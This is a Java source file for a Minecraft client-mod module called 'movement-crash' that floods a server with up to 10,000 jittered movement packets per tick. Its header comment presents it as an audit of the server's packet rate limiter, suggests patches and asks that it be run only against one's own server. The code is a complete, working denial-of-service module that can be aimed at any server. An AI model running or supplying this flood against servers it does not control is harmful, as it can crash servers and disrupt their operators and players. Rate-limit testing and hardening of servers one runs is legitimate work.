package com.example.addon.modules.crash;

import com.example.addon.AddonTemplate;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
import net.minecraft.util.math.Vec3d;

import java.util.Random;

/**
 * AUDIT: Movement Crash (high-rate jittered position flood)
 *
 * Sends full position+rotation packets (PlayerMoveC2SPacket.Full) at up to
 * 10,000 per tick, each with a small random jitter on position and random
 * yaw/pitch. Tests the raw inbound movement packet rate limiter.
 *
 * The key question is whether the server processes ALL N packets per tick
 * (validating position, checking AC, updating entity tracking) or whether
 * it rate-limits before the expensive work. If it processes all N, CPU cost
 * is linear in N; if it limits to 1–2 per tick, N has no additional cost.
 *
 * Patch signal: accept at most one authoritative movement update per tick per
 * player regardless of how many packets arrive; queue or discard excess;
 * apply wall-clock rate limits at the Netty reader stage so excess packets
 * never reach the main thread.
 *
 * Run against your OWN local server only.
 */
public class MovementCrash extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Integer> packets = sgGeneral.add(new IntSetting.Builder()
        .name("packets").description("Packets per tick.")
        .defaultValue(2000).min(1).sliderMax(10000).build()
    );
    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable").description("Disable when kicked from the server.")
        .defaultValue(true).build()
    );
    private final Setting<Boolean> showStats = sgGeneral.add(new BoolSetting.Builder()
        .name("show-stats").description("Print tick + packet count on deactivate.")
        .defaultValue(true).build()
    );

    private int ticksActive = 0, packetsSent = 0;

    private final Random random = new Random();

    public MovementCrash() {
        super(AddonTemplate.CRASH_CATEGORY, "movement-crash",
            "Spams full move packets with jittered position/rotation. Tests movement packet rate limiting.");
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if (mc.player == null) return;
        ticksActive++;
        Vec3d pos = mc.player.getEntityPos();
        for (int i = 0; i < packets.get(); i++) {
            mc.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.Full(
                pos.x + jitter(1), pos.y + jitter(1), pos.z + jitter(1),
                (float) (random.nextDouble() * 90), (float) (random.nextDouble() * 180),
                true, false));
            packetsSent++;
        }
    }

    private double jitter(double rad) {
        return random.nextDouble() * rad - (rad / 2);
    }

    @Override
    public void onDeactivate() {
        if (showStats.get()) info("Summary: %d ticks active, %d packets sent.", ticksActive, packetsSent);
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get() && isActive()) toggle();
    }
}
